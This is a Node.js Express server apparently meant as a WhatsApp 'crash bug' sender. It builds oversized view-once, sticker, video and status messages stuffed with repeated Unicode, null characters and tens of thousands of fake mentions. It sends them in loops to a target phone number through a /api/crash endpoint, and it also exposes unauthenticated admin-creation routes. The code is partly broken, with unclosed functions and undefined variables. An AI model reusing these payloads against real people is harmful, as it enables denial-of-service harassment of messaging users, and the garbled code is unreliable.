const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});
async function invis(target) {
for ( let i = 0; i < 3; i++) {
    try {
      let msg = await generateWaMessageFromcontent(target, {
        ViewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: 'Izalmodz',
                locationMessage: {
                degreesLatitude: 323000,
                degreesLongitude: -323000,
                name: '}'.repeat(50000),
                address: '{'.repeat(50000),
                },
              },
              contentInfo: {
                participant: "0@whatsapp.net",
                remodJid: "status@broadcast",
                mentionedJid: "0@whatsapp.net",
              },
              body: { 
                title: '',
             },
             nativeFlowMesssage: {
             messagePramjson: '{'.repeat(50000),
              }
            }
          }
        }
      });
      await lasser.relayMessage(target, message, { 
        participant: { jid: target },
        messageId: msg.key.id
      });
    } 
    console.log(`sukses send bug: ${target}`)
  }
}
function generateLargeString(sizeInBytes) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < sizeInBytes; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

async function bulldozer5GB(sock, jid) {
  const SID = "5e03e0&mms3";
  const key = "10000000_2012297619515179_5714769099548640934_n.enc";
  const type = "image/webp";

  const extraPayload = generateLargeString(8.5 * 1024 * 1024);

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
          fileLength: {
            low: 999999,
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Date.now() % 2147483647,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: ["0@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 999999,
          },
          stickerSentTs: {
            low: -10000000,
            high: 999,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          extraPayload,
        },
      },
    },
  };

async function force(sock, target, mention) {

const TqXMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "Delaysjh" + "ꦾ".repeat(500),
        canonicalUrl: "DelayNative" + "ោ៝".repeat(500),
        description: "NativeVirusion" + "᭭".repeat(500),
        title: "You DEAD !",
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "I terror you",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "Https://t.me/Izalmodz" + "ꦾ".repeat(500),
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "Https://" + "᭱".repeat(2000)
            },
            mentionedJid: Array.from({ length: 1000 }, () => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "🥶".repeat(1770),
        serviceType: 1
    }
};

const mentionjid = [
    "9999999999@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
];

const TheDj = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "LihX Sadness" + "ꦾ".repeat(10000),
    title: "By TqX" + "᭄".repeat(500),
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://n.uguu.se/UnDeath.jpg",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
};

const CrashMesagge = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "999999999999",
    seconds: 999999,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "𝗧᷿〭⃔𝗾⃯⃟𝗫 𝗡⃰𝗼᷈᷉𝘃᷿᳑𝗮⃮᷍𝘀𝗶𝗼⃪᷀᷼𝗻᷂⃕𝘀",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: "Delaysjhnativ",
            body: "\u0000".repeat(9117),
            mediaType: 1,
            renderLargerThumbnail: true,
            thumbnailUrl: null,
            sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
        businessMessageForwardInfo: {
            businessOwnerJid: target
        },
        quotedMessage: TqXMessage,
        isSampled: true,
        mentionedJid: mentionjid
    },
    forwardedNewsletterMessageInfo: {
        newsletterJid: "120363406229895095@newsletter",
        serverMessageId: 1,
        newsletterName: "ꦾ".repeat(100)
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
        {
            embeddedContent: TheDj,
            embeddedAction: true
        }
    ]
};

const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
        message: { videoMessage: CrashMesagge }
    }
}, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
        {
            tag: "meta",
            attrs: {},
            content: [
                {
                    tag: "mentioned_users",
                    attrs: {},
                    content: [
                        { tag: "to", attrs: { jid: target }, content: undefined }
                    ]
                }
            ]
        }
    ]
});

if (mention) {
    await sock.relayMessage(target, {
        groupStatusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                }
            }
        }
    }, {
        additionalNodes: [
            {
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }
        ]
    });
}
}

// cara munculin :

while (true) {
await force(target, true)
  const msg = generateWAMessageFromContent(jid, message, {});

  for (let i = 0; i < 600; i++) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
    });
  }
}

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }
  
  try {
    await invisHome(force,bulldozer5GB, {}); // Dummy sock untuk testing lokal //invisHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));